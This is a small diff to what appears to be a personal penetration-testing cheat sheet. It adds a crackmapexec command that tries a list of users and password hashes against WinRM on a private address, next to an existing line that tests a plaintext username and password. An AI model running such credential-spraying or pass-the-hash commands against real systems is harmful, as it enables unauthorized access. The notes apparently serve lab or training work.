@@ -362,6 +362,10 @@ a. Network Exploitation
 
 		check also this:
 		crackmapexec winrm 192.168.235.165 -u enox -p california
+		
+		With a list of hashes and users
+		crackmapexec winrm 192.168.167.175  -u users -H hashesh
+
 
 
 		e.) evil-winrm
